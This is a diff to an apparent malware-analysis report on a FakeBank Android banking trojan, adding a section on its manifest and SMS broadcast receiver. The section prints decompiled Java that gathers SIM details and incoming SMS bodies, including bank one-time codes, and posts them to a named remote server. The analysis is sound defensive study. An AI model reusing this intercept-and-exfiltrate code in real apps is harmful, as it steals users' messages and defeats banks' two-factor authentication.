@@ -70,6 +70,8 @@ Since the structure, behavior, Java code, and general characteristics of the fou
 
 == `4aec` APK (Static analysis)
 
+
+
 === Detection
 #v(0.5em)
 #figure(
@@ -82,7 +84,7 @@ Since the structure, behavior, Java code, and general characteristics of the fou
 #v(1em)
 As we can see from @community-score-fakebank, the sample is detected by 36 out of 67 antivirus engines. This is a good starting point to understand that the sample is indeed malicious. 
 
-The engines also tell us that the sample is a trojan and that it is related to the `FakeBank` family.
+The engines also tell us that the sample is a trojan and that it is related to the *FakeBank* family.
 
 === Permissions
 #v(0.5em)
@@ -99,5 +101,51 @@ The sample requests a large number of dangerous permissions (see @permission_fak
 The set of permission hints the application could sen confidential information to a remote server.
 #linebreak()
 Moreover it can write, send and read SMS messages. This could potentially allow to bypass the two-factor authentication system used by banks. 
+#v(1em)
 
-=== Manifest analysis and Receiver
+=== Manifest Analysis and Receivers
+#v(1em)
+#columns(2)[
+  #figure(
+  image("/img/Manifest_fakebank.png", width: 100%),
+  caption: [
+    AndroidManifest
+  ], 
+)
+#label("manifest")
+#colbreak()
+ #figure(
+  image("/img/receiver_fakebank.png", width: 100%),
+  caption: [
+    Receivers
+  ], 
+)
+#label("receivers")
+]
+#v(1em)
+The manifest shows that a *Broadcast Receiver* is not protected (see @manifest) the Malware intercept
+all the SMS and leak in this case the OTP codes used by the banks. 
+
+
+The *Broadcast Receiver* is implemented in the package `com.example.kbtest.smsReceiver` (see @receivers).
+#v(0.5em)
+We listed here the most important line of the package `smsReceiver`:
+```Java
+this.params2.add(new BasicNameValuePair("sim_no", simNo));
+this.params2.add(new BasicNameValuePair("tel", tel.getSimOperatorName()));
+this.params2.add(new BasicNameValuePair("thread_id", "0"));
+this.params2.add(new BasicNameValuePair("address", smsMessage.getOriginatingAddress()));
+SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+this.params2.add(new BasicNameValuePair("datetime", dateString2));
+this.params2.add(new BasicNameValuePair("bady", smsMessage.getDisplayMessageBody()));
+//.....
+HttpClient httpclient = new DefaultHttpClient();
+HttpPost httppost = new HttpPost(smsReceiver.this.update_url);
+HttpResponse response = httpclient.execute(httppost);
+```
+#v(0.5em)
+The package takes all the SIM information, the emitter and the body of the received message. Then sends all the information collected to a remote `URL` (`http://banking1.kakatt.net:9998/send_product.php`). 
+Anyway we can see, using tools like `curl` or `nslookup`, that the domain is not reachable anymore.
+
+=== Activities
+
